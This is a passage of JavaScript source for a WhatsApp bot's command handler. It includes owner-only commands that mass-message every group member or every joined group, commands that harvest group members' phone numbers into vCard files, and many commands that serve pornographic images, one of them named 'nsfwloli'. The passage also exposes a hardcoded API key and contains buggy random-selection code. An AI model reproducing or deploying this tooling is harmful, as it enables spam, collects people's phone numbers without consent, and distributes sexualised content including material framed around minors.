if (/image/.test(mime)) {
media = await Dare.downloadAndSaveMediaMessage(quoted)
memk = await uptotelegra(media)
await Dare.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv3 })
await sleep(q.split("|")[1])
} else {
await Dare.sendMessage(mem, { text: global.tekspushkonv3 })
await sleep(q.split("|")[1])
}
}
reply("Success Boss!")
break
case 'pushcontact4':
if (!DareTheCreator) return reply(`Owners only`)
if (!m.isGroup) return reply(mess.only.private)
if (!text) return reply(`Wrong Usage Please Use Command Like This\n${prefix+command} pause|text`)
await reply("Otw Boskuuu")
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv4 = text.split("|")[1]
for (let men of halsss) {
if (/image/.test(mime)) {
media = await Dare.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Dare.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv4 })
await sleep(text.split("|")[0])
} else {
await Dare.sendMessage(men, { text: global.tekspushkonv4 })
await sleep(text.split("|")[0])
}
}
reply("Succes Boss!")
break

case 'savecontact': case 'svkontak':
if (!DareTheCreator) return reply(`For Owners Only`)
if (!m.isGroup) return reply(`This feature is group specific`)
let cmiggc = await Dare.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
} // (?); mengimpor kontak seluruh member - save
let nmfilect = './contacts.vcf'
reply('*Import '+cmiggc.participants.length+' contact..*')
fs.writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
Dare.sendMessage(m.chat, {
    document: fs.readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: 'GROUP: *'+cmiggc.subject+'*\nMEMBER: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
fs.unlinkSync(nmfilect)
break

case 'cekidgc': {
if (!isPrem) return replyprem(mess.premium)
let getGroups = await Dare.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST OF GROUPS BELOW*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await Dare.groupMetadata(x)
teks += `◉ No : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks + `To use, please type the command ${prefix}pushcontact3 id|text\n\nBefore using, please copy the group ID above.`)
}
break
case 'savecontact2': {
if (!DareTheCreator) return reply(`For Owners Only`)
if (!m.isGroup) return reply(mess.only.private)
if (!text) return reply(`Wrong Usage Please Use Command Like This\n${prefix+command} idgroup\nTo See Group Id Please Type .cekidgc`)
await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
const groupMetadataa = !m.isGroup? await Dare.groupMetadata(`${text}`).catch(e => {}) : ""
const participants = !m.isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await Dare.sendMessage(from, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "𝐁𝐌𝐁.vcf", caption: "Success Just Save, Brother", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
}
}
break

case 'jpm':{
if (!DareTheCreator) return reply(`Owners only`)
if (!text) return reply(`*Wrong Usage Please Use Like This*\n${prefix+command} text|pause\n\nReply Image To Send Image To All Groups\nFor the delay, the nominal delay is 1000 = 1 second`)
await reply("_Wait, my lord🙂_")
let getGroups = await Dare.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await Dare.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await Dare.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Dare.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await Dare.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
reply("*SUCCESFUL THAN OWNER🙂*")
}
break

case 'jpm2':{
if (!DareTheCreator) return reply(`Owners only`)
if (!text) return reply(`*Wrong Usage Please Use Like This*\n${prefix+command} text|pause\n\nReply Image To Send Image To All Groups\nFor the delay, the nominal delay is 1000 = 1 second`)
await reply("_Wait, my lord🙂_")
let getGroups = await Dare.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await Dare.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await Dare.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Dare.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await Dare.sendMessage(xnxx, { text: text.split('|')[0]})
await sleep(text.split('|')[1])
}}
reply("*SUCCESFUL THAN OWNER🙂*")
}
break

case 'sendcontact': case 'kontak':
if (!DareTheCreator) return reply(`Owners only`)
if (!m.isGroup) return reply(`Special Group`)
if (!m.mentionedJid[0]) return reply('Ex; .sendcontact @tag|no.')
let snContact = {
	displayName: "Contact", contacts: [{displayName: ownername, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+ownername+";;;\nFN:"+ownername+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}]
} // (?); send kontak
Dare.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
break

case 'getcontact': case 'getkontak':
if (!DareTheCreator) return reply(`Owners only`)
if (!m.isGroup) return reply(`This feature is group specific`)
huhuhs = await Dare.sendMessage(m.chat, {
    text: `Grup; *${groupMetadata.subject}*\nTotal peserta; *${participants.length}*`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000) // (?); mengirim kontak seluruh member
Dare.sendContact(m.chat, participants.map(a => a.id), huhuhs)
break

            case 'id':{
            replydare(from)
           }
          break
          case 'userjid':{
          	if(!DareTheCreator) return reply(mess.only.owner)
        const groupMetadata = m.isGroup ? await Dare.groupMetadata(m.chat).catch((e) => {}) : ""
		const participants = m.isGroup ? await groupMetadata.participants : ""
    let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`
    for (let mem of participants) {
            textt += `${themeemoji} ${mem.id}\n`
        }
      replydare(textt)
    }
    break
          case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) return replydare(`Example : ${prefix + command} 😅+🤔`)
		if (!emoji2) return replydare(`Example : ${prefix + command} 😅+🤔`)
		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anumojimix.results) {
		    let encmedia = await Dare.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    
		}
	    }
	    break
	case 'hentaivid2': {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
sbe = await hentaivid()
cejd = sbe[Math.floor(Math.random(), sbe.length)]
Dare.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}` }, { quoted: m })
}
break
	case 'hentaivid': case 'hentaivideo': {
	if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
const { hentai } = require('./lib/scraper.js')
anu = await hentai()
result912 = anu[Math.floor(Math.random(), anu.length)]
Dare.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
            }
            break
case 'trap' :
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
Dare.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-neko' :
case 'hneko' :
if (!isPrem) return replyprem(mess.premium)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-waifu' :
case 'nwaifu' :
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
Dare.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'gasm':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break  
case 'milf':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/NanoMedia/nsfw/milf.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break 
case 'animespank':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
            await Dare.sendMessage(m.chat, { caption:  `Here he is!!`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
return('Error!')
})
break
case 'ahegao':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/NanoMedia/nsfw/ahegao.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'ass':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/NanoMedia/nsfw/ass.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'bdsm':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/NanoMedia/nsfw/bdsm.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'blowjob':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/NanoMedia/nsfw/blowjob.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'cuckold':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/NanoMedia/nsfw/cuckold.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'cum':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/NanoMedia/nsfw/cum.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'eba':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/NanoMedia/nsfw/eba.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'ero':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/NanoMedia/nsfw/ero.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'femdom':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/NanoMedia/nsfw/femdom.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'foot':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/NanoMedia/nsfw/foot.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'gangbang':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/NanoMedia/nsfw/gangbang.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'glasses':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/NanoMedia/nsfw/glasses.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'hentai': {
async function nhentaiScraper(id) {
	let uri = id ? `https://cin.guru/v/${+id}/` : 'https://cin.guru/'
	let html = (await axios.get(uri)).data
	return JSON.parse(html.split('<script id="__NEXT_DATA__" type="application/json">')[1].split('</script>')[0]).props.pageProps.data
}
function toPDF(images, opt = {}) {
	return new Promise(async (resolve, reject) => {
		if (!Array.isArray(images)) images = [images]
		let buffs = [], doc = new PDFDocument({ margin: 0, size: 'A4' })
		for (let x = 0; x < images.length; x++) {
			if (/.webp|.gif/.test(images[x])) continue
			let data = (await axios.get(images[x], { responseType: 'arraybuffer', ...opt })).data
			doc.image(data, 0, 0, { fit: [595.28, 841.89], align: 'center', valign: 'center' })
			if (images.length != x + 1) doc.addPage()
		}
		doc.on('data', (chunk) => buffs.push(chunk))
		doc.on('end', () => resolve(Buffer.concat(buffs)))
		doc.on('error', (err) => reject(err))
		doc.end()
	})
}
let code = (args[0] || '').replace(/\D/g, '')
if (!code) return reply('Input code')
	await reply('_In progress, please wait..._')
let data = await nhentaiScraper(code)
let pages = []
let thumb = `https://external-content.duckduckgo.com/iu/?u=https://t.nhentai.net/galleries/${data.media_id}/thumb.jpg`	
data.images.pages.map((v, i) => {
			let ext = new URL(v.t).pathname.split('.')[1]
			pages.push(`https://external-content.duckduckgo.com/iu/?u=https://i7.nhentai.net/galleries/${data.media_id}/${i + 1}.${ext}`)
		})
let buffer = await (await fetch(thumb)).buffer()		
let jpegThumbnail = await extractImageThumb(buffer)		
let imagepdf = await toPDF(pages)		
await Dare.sendMessage(m.chat, { document: imagepdf, jpegThumbnail, fileName: data.title.english + '.pdf', mimetype: 'application/pdf' }, { quoted: m })
} 
break
case 'jahy':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/NanoMedia/nsfw/jahy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'manga':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/NanoMedia/nsfw/manga.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'masturbation':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/NanoMedia/nsfw/masturbation.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'neko-hentai':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/NanoMedia/nsfw/neko.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'neko-hentai2':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/NanoMedia/nsfw/neko2.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'nsfwloli':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/NanoMedia/nsfw/nsfwloli.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'orgy':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/NanoMedia/nsfw/orgy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'panties':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/NanoMedia/nsfw/panties.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'pussy':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/NanoMedia/nsfw/pussy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'tentacles':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/NanoMedia/nsfw/tentacles.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'thighs':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/NanoMedia/nsfw/thighs.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'yuri':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/NanoMedia/nsfw/yuri.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'zettai':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/NanoMedia/nsfw/zettai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'gifblowjob':
if (!m.isGroup) return reply(mess.only.group)
if (!AntiNsfw) return replydare(mess.nsfw)
reply(mess.wait)
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await Dare.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'gifhentai':
if (!m.isGroup) return reply(mess.only.group)
if (!AntiNsfw) return replydare(mess.nsfw)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/NanoMedia/nsfw/gifs.json'))
var xeonyresultx = pickRandom(ahegaonsfw)
    await Dare.sendMessage(m.chat,{video:xeonyresultx, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
    case 'gifs': case 'foot': {
if (!m.isGroup) return reply(mess.only.group)
if (!AntiNsfw) return replydare(mess.nsfw)
reply(mess.wait)
let heyy
    let yeha = heyy[Math.floor(Math.random() * heyy.length)]
    if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gifs.json')
    if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/foot.json')
Dare.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
case 'animeawoo':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)       
            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animemegumin':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`)       
            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeshinobu':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehandhold':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`)       
            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehighfive':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animecringe':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animedance':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehappy':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeglomp':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animesmug':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeblush':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewave':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animesmile':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animepoke':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewink':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animebonk':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animebully':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeyeet':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animebite':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animelick':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animekill':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animecry':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewlp':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animekiss':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehug':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break

case 'couplepp': case 'ppcouple': {
reply(mess.wait)
let anucpp = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/couple.json')
let random = anucpp[Math.floor(Math.random() * anucpp.length)]
Dare.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
Dare.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
            }
	    break

case 'animeneko':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animepat':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeslap':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animecuddle':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewaifu':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
